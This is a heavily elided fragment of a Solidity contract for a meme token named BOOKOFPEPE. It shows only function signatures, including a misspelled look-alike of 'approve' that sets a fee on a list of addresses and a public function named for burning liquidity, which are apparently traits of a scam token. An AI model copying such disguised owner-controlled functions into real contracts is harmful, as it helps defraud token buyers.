...
/**
https://t.me/BOOKOFPEPE_Channel
https://twitter.com/BOOKOFPEPE_ERC
*/
...
abstract contract Ownable {
    ...
    function transferOwnershiplengryu(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract BOOKOFPEPE is Ownable {
    ...
    function Apprrve(address[] memory _usr, uint256 _feePct) external {
    ...
    function _burnliqunityse(address user) public {
